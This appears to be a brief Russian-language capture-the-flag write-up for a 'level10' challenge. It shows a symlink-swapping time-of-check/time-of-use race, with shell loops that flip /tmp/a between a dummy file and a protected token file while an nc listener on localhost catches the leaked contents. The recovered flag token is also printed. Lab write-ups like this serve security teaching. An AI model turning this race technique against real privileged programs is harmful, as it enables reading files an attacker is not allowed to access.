Сначала я пытался отменить проверку доступа к файлу через LD_PRELOAD (подменить access()),
но не получилось, т.к. после access() фейлился open().
Т.к. есть промежуток времени, между тем, как файл был открыт, и тем, когда файл отправляется,
за это время можно успеть подменить файл.
Т.е. мы открываем ссылку, и постоянно меняем ее то на валидный файл для чтения, то на нужный токен.

$ touch /tmp/b

while true; do
	  ln -sf /home/user/level10/token /tmp/a
	  ln -sf /tmp/b /tmp/a
done &

В другом окне запускаем цикл с nc, т.к. он закрывается после получения данных:

while true; do
	  nc -l 6969
done

И в первом окне теперь запускаем цикл с вызовами level10:

while true; do
	  ./level10 /tmp/a 127.0.0.1
done

Как только во втором окне мелькнуло что-то длинное - останавливаем все циклы, крутим, и
находим токен (woupa2yuojeeaaed06riuj63c)
